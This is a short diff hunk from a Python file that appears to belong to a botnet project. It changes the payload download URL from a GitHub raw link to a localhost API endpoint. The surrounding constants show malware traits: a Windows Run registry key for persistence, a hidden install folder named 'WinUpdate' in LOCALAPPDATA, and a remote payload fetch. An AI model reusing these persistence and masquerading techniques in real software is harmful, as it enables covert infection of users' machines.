@@ -21,7 +21,7 @@ from urllib.request import urlopen
 import requests
 
 KEY_PATH = r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
-PAYLOAD_URL = r"https://github.com/notclement/botnet-enumeration-network/raw/master/resources/payload.txt"
+PAYLOAD_URL = r'http://127.0.0.1:8000/api/payloads/payload.txt'
 GOOGLE_DNS = 'http://www.google.com'
 PATH_TO_HIDE = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
 
